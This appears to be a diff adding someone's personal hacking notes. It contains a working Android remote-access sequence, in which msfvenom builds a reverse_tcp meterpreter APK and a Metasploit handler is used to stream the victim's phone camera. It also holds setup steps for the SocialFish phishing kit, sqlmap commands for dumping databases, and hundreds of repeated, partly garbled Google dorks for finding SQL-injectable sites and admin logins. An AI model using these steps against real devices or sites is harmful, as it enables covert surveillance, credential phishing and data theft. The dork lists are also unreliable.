@@ -1,0 +1,761 @@
+python sqliv.py sql inj
+to install
+git clone
+run      curl
+pip install -r ....  install
+ls             open
+cd ..          eg cd desktop
+cat .... -i   
+
+password hach cracking list
+
+rockyou list
+linkin list
+
+sudo -s    root access
+
+echo "deb https://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list    
+
+apt-get update 
+sudo apt-get update && sudo apt-get dist-upgrade
+ to update all repostores
+
+service tor start
+service tor stop
+service tor restart
+
+
+Where to Report a Browser Bug
+
+You need to go to vendor's bug reporting website to report a bug of browser.
+
+    Mozilla's Bugzilla
+    WebKit Bugzilla
+    Chrome Bugs
+    Opera Bug Report Wizard
+    IE Bugs
+    Apple Bug Reporter (Safari)
+    Other browsers - please check vendor's website for bug reporting information
+
+
+
+social fishing ...installastion
+git clone https://github.com/UndeadSec/SocialFish.git
+cd SocialFish/
+sudo apt-get install python3-pip php unzip -y
+pip3 install -r requirements.txt
+chmod +x SocialFish.py
+
+python3 SocialFish.py alan ac4blackflag .... to run 
+
+
+python scanqli -u [URL] [OPTIONS] .....to start sql vulernabilite scan on web page by useing scanqli
+
+
+
+
+
+
+
+hacking camera of phone
+
+root@alan:/home/alan# msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.42.134 lport=4444 R>/home/alan/Desktop/c.apk
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 10179 bytes
+
+root@alan:/home/alan# msfconsole
+[-] ***rting the Metasploit Framework console.../
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+
+  Metasploit Park, System Security Interface                                     
+  Version 4.0.5, Alpha E                                                         
+  Ready...                                                                       
+  > access security                                                              
+  access: PERMISSION DENIED.
+  > access security grid
+  access: PERMISSION DENIED.
+  > access main security grid
+  access: PERMISSION DENIED....and...
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!                                                 
+  YOU DIDN'T SAY THE MAGIC WORD!                                                 
+  YOU DIDN'T SAY THE MAGIC WORD!                                                 
+  YOU DIDN'T SAY THE MAGIC WORD!                                                 
+  YOU DIDN'T SAY THE MAGIC WORD!                                                 
+  YOU DIDN'T SAY THE MAGIC WORD!                                                 
+
+
+       =[ metasploit v5.0.66-dev                          ]
++ -- --=[ 1956 exploits - 1092 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 > use exploit/multi/handler
+
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 192.168.42.134
+lhost => 192.168.42.238
+msf5 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.42.134:4444 
+  
+
+
+help
+webcam_stream
+
+
+...............
+
+proxychains firefox wwww.duckduckgo.com
+
+nano /etc/proxychains.conf   to open proxychain edit
+
+google dorks
+inurl:/index.php?id=
+inurl:/trainers.php?id=
+inurl:/buy.php?category=
+inurl:/article.php?ID=
+inurl:/lay_old.php?id=
+inurl:/declaration_more.php?decl_id=
+inurl:/ageid=
+inurl:/games.php?id=
+inurl:/age.php?file=
+inurl:/newsDetail.php?id=
+inurl:/gallery.php?id=d=
+inurl:/event.php?id=
+inurl:/roduct-item.php?id=
+inurl:/sql.php?id=
+inurl:/news_view.php?id=
+inurl:/select_biblio.php?id=
+inurl:/humor.php?id=
+inurl:/aboutbook.php?id=
+inurl:/fiche_spectacle.php?id=
+inurl:/article.php?id=
+inurl:/show.php?id=
+inurl:/staff_id=
+inurl:/newsitem.php?num=
+inurl:/readnews.php?id=
+inurl:/top10.php?cat=
+inurl:/historialeer.php?num=
+inurl:/reagir.php?num=
+inurl:/tray-Questions-View.php?num=
+inurl:/forum_bds.php?num=
+inurl:/game.php?id=
+inurl:/view_product.php?id=
+inurl:/newsone.php?id=
+inurl:/sw_comment.php?id=
+inurl:/news.php?id=
+inurl:/avd_start.php?av
+inurl:/communique_detail.php?id=
+inurl:/sem.php3?id=
+inurl:/kategorie.php4?id=
+inurl:/news.php?id=
+inurl:/index.php?id=
+inurl:/faq2.php?id=
+inurl:/show_an.php?id=
+inurl:/review.php?id=
+inurl:/loadpsb.php?id=
+inurl:/pinions.php?id=
+inurl:/spr.php?id=
+inurl:/ages.php?id=
+inurl:/announce.php?id=
+inurl:/clanek.php4?id=
+inurl:/articipant.php?id=
+inurl:/download.php?id=
+inurl:/main.php?id=
+inurl:/review.php?id=
+inurl://chappies.php?id=
+inurl://read.php?id=
+inurl://rod_detail.php?id=
+inurl:/viewphoto.php?id=
+inurl:/article.php?id=
+inurl:/erson.php?id=
+inurl:/roductinfo.php?id=
+inurl:/showimg.php?id=
+inurl:/view.php?id=
+inurl:/website.php?id=
+inurl:/hosting_info.php?id=
+inurl:/gallery.php?id=
+inurl:/rub.php?idr=
+inurl:/view_faq.php?id=
+inurl:/artikelinfo.php?id=
+inurl:/detail.php?ID=
+inurl:/index.php?=
+inurl:/rofile_view.php?id=
+inurl:/category.php?id=
+inurl:/ublications.php?id=
+inurl:/fellows.php?id=
+inurl:/downloads_info.php?id=
+inurl:/rod_info.php?id=
+inurl:/shop.php?do=part&id=
+inurl:/roductinfo.php?id=
+inurl:/collectionitem.php?id=
+inurl:/band_info.php?id=
+inurl:/roduct.php?id=
+inurl:/releases.php?id=
+inurl:/ray.php?id=
+inurl:/roduit.php?id=
+inurl:/op.php?id=
+inurl:/shopping.php?id=
+inurl:/roductdetail.php?id=
+inurl:/lost.php?id=
+inurl:/viewshowdetail.php?id=
+inurl:/clubpage.php?id=
+inurl:/memberInfo.php?id=
+inurl:/section.php?id=
+inurl:/theme.php?id=
+inurl:/age.php?id=
+inurl:/shredder-categories.php?id=
+inurl:/tradeCategory.php?id=
+inurl:/product_ranges_view.php?ID=
+inurl:/shop_category.php?id=
+inurl:/tran******.php?id=
+inurl:/channel_id=
+inurl:/item_id=
+inurl:/newsid=
+inurl:/trainers.php?id=
+inurl:/news-full.php?id=
+inurl:/news_display.php?getid=
+inurl:/index2.php?option=
+inurl:/readnews.php?id=
+inurl:/top10.php?cat=
+inurl:/newsone.php?id=
+inurl:/event.php?id=
+inurl:/product-item.php?id=
+inurl:/sql.php?id=
+inurl:/aboutbook.php?id=
+inurl:/review.php?id=
+inurl:/loadpsb.php?id=
+inurl:/ages.php?id=
+inurl:/material.php?id=
+inurl:/clanek.php4?id=
+inurl:/announce.php?id=
+inurl:/chappies.php?id=
+inurl:/read.php?id=
+inurl:/viewapp.php?id=
+inurl:/viewphoto.php?id=
+inurl:/rub.php?idr=
+inurl:/galeri_info.php?l=
+inurl:/review.php?id=
+inurl:/iniziativa.php?in=
+inurl:/curriculum.php?id=
+inurl:/labels.php?id=
+inurl:/story.php?id=
+inurl:/look.php?ID=
+inurl:/newsone.php?id=
+inurl:/aboutbook.php?id=
+inurl:/material.php?id=
+inurl:/pinions.php?id=
+inurl:/announce.php?id=
+inurl:/rub.php?idr=
+inurl:/galeri_info.php?l=
+inurl:/tekst.php?idt=
+inurl:/newscat.php?id=
+inurl:/newsticker_info.php?idn=
+inurl:/rubrika.php?idr=
+inurl:/rubp.php?idr=
+inurl:/offer.php?idf=
+inurl:/art.php?idm=
+inurl:/title.php?id=
+inurl:/info.php?id=
+inurl:/pro.php?id=
+inurl:/index.php?id=
+inurl:/trainers.php?id=
+inurl:/buy.php?category=
+inurl:/article.php?ID=
+inurl:/lay_old.php?id=
+inurl:/declaration_more.php?decl_id=
+inurl:/ageid=
+inurl:/games.php?id=
+inurl:/age.php?file=
+inurl:/newsDetail.php?id=
+inurl:/gallery.php?id=
+inurl:/article.php?id=
+inurl:/show.php?id=
+inurl:staff_id=
+inurl:newsitem.php?num=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:historialeer.php?num=
+inurl:reagir.php?num=
+inurltray-Questions-View.php?num=
+inurl:forum_bds.php?num=
+inurl:game.php?id=
+inurl:view_product.php?id=
+inurl:newsone.php?id=
+inurl:sw_comment.php?id=
+inurl:news.php?id=
+inurl:avd_start.php?avd=
+inurl:event.php?id=
+inurlroduct-item.php?id=
+inurl:sql.php?id=
+inurl:news_view.php?id=
+inurl:select_biblio.php?id=
+inurl:humor.php?id=
+inurl:aboutbook.php?id=
+inurl:fiche_spectacle.php?id=
+inurl:communique_detail.php?id=
+inurl:sem.php3?id=
+inurl:kategorie.php4?id=
+inurl:news.php?id=
+inurl:index.php?id=
+inurl:faq2.php?id=
+inurl:show_an.php?id=
+inurlreview.php?id=
+inurl:loadpsb.php?id=
+inurlpinions.php?id=
+inurl:spr.php?id=
+inurlages.php?id=
+inurl:announce.php?id=
+inurl:clanek.php4?id=
+inurlarticipant.php?id=
+inurl:download.php?id=
+inurl:main.php?id=
+inurl:review.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurlrod_detail.php?id=
+inurl:viewphoto.php?id=
+inurl:article.php?id=
+inurlerson.php?id=
+inurlroductinfo.php?id=
+inurl:showimg.php?id=
+inurl:view.php?id=
+inurl:website.php?id=
+inurl:hosting_info.php?id=
+inurl:gallery.php?id=
+inurl:rub.php?idr=
+inurl:view_faq.php?id=
+inurl:artikelinfo.php?id=
+inurl:detail.php?ID=
+inurl:index.php?=
+inurlrofile_view.php?id=
+inurl:category.php?id=
+inurlublications.php?id=
+inurl:fellows.php?id=
+inurl:downloads_info.php?id=
+inurlrod_info.php?id=
+inurl:shop.php?do=part&id=
+inurlroductinfo.php?id=
+inurl:collectionitem.php?id=
+inurl:band_info.php?id=
+inurlroduct.php?id=
+inurl:releases.php?id=
+inurl:ray.php?id=
+inurlroduit.php?id=
+inurlop.php?id=
+inurl:shopping.php?id=
+inurlroductdetail.php?id=
+inurlost.php?id=
+inurl:viewshowdetail.php?id=
+inurl:clubpage.php?id=
+inurl:memberInfo.php?id=
+inurl:section.php?id=
+inurl:theme.php?id=
+inurlage.php?id=
+inurl:shredder-categories.php?id=
+inurl:tradeCategory.php?id=
+inurlroduct_ranges_view.php?ID=
+inurl:shop_category.php?id=
+inurl:tran******.php?id=
+inurl:channel_id=
+inurl:item_id=
+inurl:newsid=
+inurl:trainers.php?id=
+inurl:news-full.php?id=
+inurl:news_display.php?getid=
+inurl:index2.php?option=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:newsone.php?id=
+inurl:event.php?id=
+inurlroduct-item.php?id=
+inurl:sql.php?id=
+inurl:aboutbook.php?id=
+inurl:review.php?id=
+inurl:loadpsb.php?id=
+inurl:ages.php?id=
+inurl:material.php?id=
+inurl:clanek.php4?id=
+inurl:announce.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurl:viewapp.php?id=
+inurl:viewphoto.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:review.php?id=
+inurl:iniziativa.php?in=
+inurl:curriculum.php?id=
+inurl:labels.php?id=
+inurl:story.php?id=
+inurl:look.php?ID=
+inurl:newsone.php?id=
+inurl:aboutbook.php?id=
+inurl:material.php?id=
+inurlpinions.php?id=
+inurl:announce.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:tekst.php?idt=
+inurl:newscat.php?id=
+inurl:newsticker_info.php?idn=
+inurl:rubrika.php?idr=
+inurl:rubp.php?idr=
+inurlffer.php?idf=
+inurl:art.php?idm=
+inurl:title.php?id=
+inurl:shop+php?id+site:fr
+"inurl:admin.asp"
+"inurl:login/admin.asp"
+"inurl:admin/login.asp"
+"inurl:adminlogin.asp"
+"inurl:adminhome.asp"
+"inurl:admin_login.asp"
+"inurl:administratorlogin.asp"
+"inurl:login/administrator.asp"
+"inurl:administrator_login.asp"
+inurl:"id=" & intext:"Warning: mysql_fetch_assoc()
+inurl:"id=" & intext:"Warning: mysql_fetch_array()
+inurl:"id=" & intext:"Warning: mysql_num_rows()
+inurl:"id=" & intext:"Warning: session_start()
+inurl:"id=" & intext:"Warning: getimagesize()
+inurl:"id=" & intext:"Warning: is_writable()
+inurl:"id=" & intext:"Warning: getimagesize()
+inurl:"id=" & intext:"Warning: Unknown()
+inurl:"id=" & intext:"Warning: session_start()
+inurl:"id=" & intext:"Warning: mysql_result()
+inurl:"id=" & intext:"Warning: pg_exec()
+inurl:"id=" & intext:"Warning: mysql_result()
+inurl:"id=" & intext:"Warning: mysql_num_rows()
+inurl:"id=" & intext:"Warning: mysql_query()
+inurl:"id=" & intext:"Warning: array_merge()
+inurl:"id=" & intext:"Warning: preg_match()
+inurl:"id=" & intext:"Warning: ilesize()
+inurl:"id=" & intext:"Warning: filesize()
+inurl:"id=" & intext:"Warning: require()
+inurl:index.php?id=
+inurl:trainers.php?id=
+inurl:login.asp
+index of:/admin/login.asp
+inurl:buy.php?category=
+inurl:article.php?ID=
+inurl:play_old.php?id=
+inurl:declaration_more.php?decl_id=
+inurl:pageid=
+inurl:games.php?id=
+inurl:page.php?file=
+inurl:newsDetail.php?id=
+inurl:gallery.php?id=
+inurl:article.php?id=
+inurl:show.php?id=
+inurl:staff_id=
+inurl:newsitem.php?num=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:historialeer.php?num=
+inurl:reagir.php?num=
+inurl:Stray-Questions-View.php?num=
+inurl:forum_bds.php?num=
+inurl:game.php?id=
+inurl:view_product.php?id=
+inurl:newsone.php?id=
+inurl:sw_comment.php?id=
+inurl:news.php?id=
+inurl:avd_start.php?avd=
+inurl:event.php?id=
+inurl:product-item.php?id=
+inurl:sql.php?id=
+inurl:news_view.php?id=
+inurl:select_biblio.php?id=
+inurl:humor.php?id=
+inurl:aboutbook.php?id=
+inurl:ogl_inet.php?ogl_id=
+inurl:fiche_spectacle.php?id=
+inurl:communique_detail.php?id=
+inurl:sem.php3?id=
+inurl:kategorie.php4?id=
+inurl:news.php?id=
+inurl:index.php?id=
+inurl:faq2.php?id=
+inurl:show_an.php?id=
+inurl:preview.php?id=
+inurl:loadpsb.php?id=
+inurl:opinions.php?id=
+inurl:spr.php?id=
+inurl:pages.php?id=
+inurl:announce.php?id=
+inurl:clanek.php4?id=
+inurl:participant.php?id=
+inurl:download.php?id=
+inurl:main.php?id=
+inurl:review.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurl:prod_detail.php?id=
+inurl:viewphoto.php?id=
+inurl:article.php?id=
+inurl:person.php?id=
+inurl:productinfo.php?id=
+inurl:showimg.php?id=
+inurl:view.php?id=
+inurl:website.php?id=
+inurl:hosting_info.php?id=
+inurl:gallery.php?id=
+inurl:rub.php?idr=
+inurl:view_faq.php?id=
+inurl:artikelinfo.php?id=
+inurl:detail.php?ID=
+inurl:index.php?=
+inurl:profile_view.php?id=
+inurl:category.php?id=
+inurl:publications.php?id=
+inurl:fellows.php?id=
+inurl:downloads_info.php?id=
+inurl:prod_info.php?id=
+inurl:shop.php?do=part&id=
+inurl:productinfo.php?id=
+inurl:collectionitem.php?id=
+inurl:band_info.php?id=
+inurl:product.php?id=
+inurl:releases.php?id=
+inurl:ray.php?id=
+inurl:produit.php?id=
+inurl:produit.php?id=+site:fr
+inurl:pop.php?id=
+inurl:shopping.php?id=
+inurl:productdetail.php?id=
+inurl:post.php?id=
+inurl:viewshowdetail.php?id=
+inurl:clubpage.php?id=
+inurl:memberInfo.php?id=
+inurl:section.php?id=
+inurl:theme.php?id=
+inurl:page.php?id=
+inurl:shredder-categories.php?id=
+inurl:tradeCategory.php?id=
+inurl:product_ranges_view.php?ID=
+inurl:shop_category.php?id=
+inurl:transcript.php?id=
+inurl:channel_id=
+inurl:item_id=
+inurl:newsid=
+inurl:trainers.php?id=
+inurl:news-full.php?id=
+inurl:news_display.php?getid=
+inurl:index2.php?option=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:newsone.php?id=
+inurl:event.php?id=
+inurl:product-item.php?id=
+inurl:sql.php?id=
+inurl:aboutbook.php?id=
+inurl:preview.php?id=
+inurl:loadpsb.php?id=
+inurl:pages.php?id=
+inurl:material.php?id=
+inurl:clanek.php4?id=
+inurl:announce.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurl:viewapp.php?id=
+inurl:viewphoto.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:review.php?id=
+inurl:iniziativa.php?in=
+inurl:curriculum.php?id=
+inurl:labels.php?id=
+inurl:story.php?id=
+inurl:look.php?ID=
+inurl:newsone.php?id=
+inurl:aboutbook.php?id=
+inurl:material.php?id=
+inurl:opinions.php?id=
+inurl:announce.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:tekst.php?idt=
+inurl:newscat.php?id=
+inurl:newsticker_info.php?idn=
+inurl:rubrika.php?idr=
+inurl:rubp.php?idr=
+inurl:offer.php?idf=
+inurl:art.php?idm=
+inurl:title.php?id=
+inurl:index.php?id=
+inurl:trainers.php?id=
+inurl:buy.php?category=
+inurl:article.php?ID=
+inurllay_old.php?id=
+inurl:declaration_more.php?decl_id=
+inurlageid=
+inurl:games.php?id=
+inurlage.php?file=
+inurl:newsDetail.php?id=
+inurl:gallery.php?id=
+inurl:article.php?id=
+inurl:show.php?id=
+inurl:staff_id=
+inurl:newsitem.php?num=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:historialeer.php?num=
+inurl:reagir.php?num=
+inurltray-Questions-View.php?num=
+inurl:forum_bds.php?num=
+inurl:game.php?id=
+inurl:view_product.php?id=
+inurl:newsone.php?id=
+inurl:sw_comment.php?id=
+inurl:news.php?id=
+inurl:avd_start.php?avd=
+inurl:event.php?id=
+inurlroduct-item.php?id=
+inurl:sql.php?id=
+inurl:news_view.php?id=
+inurl:select_biblio.php?id=
+inurl:humor.php?id=
+inurl:aboutbook.php?id=
+inurl:fiche_spectacle.php?id=
+inurl:communique_detail.php?id=
+inurl:sem.php3?id=
+inurl:kategorie.php4?id=
+inurl:news.php?id=
+inurl:index.php?id=
+inurl:faq2.php?id=
+inurl:show_an.php?id=
+inurlreview.php?id=
+inurl:loadpsb.php?id=
+inurlpinions.php?id=
+inurl:spr.php?id=
+inurlages.php?id=
+inurl:announce.php?id=
+inurl:clanek.php4?id=
+inurlarticipant.php?id=
+inurl:download.php?id=
+inurl:main.php?id=
+inurl:review.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurlrod_detail.php?id=
+inurl:viewphoto.php?id=
+inurl:article.php?id=
+inurlerson.php?id=
+inurlroductinfo.php?id=
+inurl:showimg.php?id=
+inurl:view.php?id=
+inurl:website.php?id=
+inurl:hosting_info.php?id=
+inurl:gallery.php?id=
+inurl:rub.php?idr=
+inurl:view_faq.php?id=
+inurl:artikelinfo.php?id=
+inurl:detail.php?ID=
+inurl:index.php?=
+inurlrofile_view.php?id=
+inurl:category.php?id=
+inurlublications.php?id=
+inurl:fellows.php?id=
+inurl:downloads_info.php?id=
+inurlrod_info.php?id=
+inurl:shop.php?do=part&id=
+inurlroductinfo.php?id=
+inurl:collectionitem.php?id=
+inurl:band_info.php?id=
+inurlroduct.php?id=
+inurl:releases.php?id=
+inurl:ray.php?id=
+inurlroduit.php?id=
+inurlop.php?id=
+inurl:shopping.php?id=
+inurlroductdetail.php?id=
+inurlost.php?id=
+inurl:viewshowdetail.php?id=
+inurl:clubpage.php?id=
+inurl:memberInfo.php?id=
+inurl:section.php?id=
+inurl:theme.php?id=
+inurlage.php?id=
+inurl:shredder-categories.php?id=
+inurl:tradeCategory.php?id=
+inurlroduct_ranges_view.php?ID=
+inurl:shop_category.php?id=
+inurl:transcript.php?id=
+inurl:channel_id=
+inurl:item_id=
+inurl:newsid=
+inurl:trainers.php?id=
+inurl:news-full.php?id=
+inurl:news_display.php?getid=
+inurl:index2.php?option=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:newsone.php?id=
+inurl:event.php?id=
+inurlroduct-item.php?id=
+inurl:sql.php?id=
+inurl:aboutbook.php?id=
+inurl:review.php?id=
+inurl:loadpsb.php?id=
+inurl:ages.php?id=
+inurl:material.php?id=
+inurl:clanek.php4?id=
+inurl:announce.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurl:viewapp.php?id=
+inurl:viewphoto.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:review.php?id=
+inurl:iniziativa.php?in=
+inurl:curriculum.php?id=
+inurl:labels.php?id=
+inurl:story.php?id=
+inurl:look.php?ID=
+inurl:newsone.php?id=
+inurl:aboutbook.php?id=
+inurl:material.php?id=
+inurlpinions.php?id=
+inurl:announce.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:tekst.php?idt=
+inurl:newscat.php?id=
+inurl:newsticker_info.php?idn=
+inurl:rubrika.php?idr=
+inurl:rubp.php?idr=
+inurl:offer.php?idf=
+inurl:art.php?idm=
+inurl:title.php?=
+
+sqlmap -u url --dbms                              display db name
+sqlmap -u url --table -D dbname                display table name 
+sqlmap -u url --coloum -D dbname -T tablename  display coloum 
+
+
+to change user agent and sent a post methode
+
+curl -H "User-Agent:" http://example.com/
+
+to sent a post request 
+
+curl -X POST https://example.com/resource.cgi
+
+to sent a post referer
+
+ curl -H "Referer:awesomesauce.com" http://165.227.106.113/header.php
+
+user agent and referer combined 
+curl -H "User-Agent: Sup3rS3cr3tAg3nt" -H "Referer:awesomesauce.com" http://165.227.106.113/header.php
+
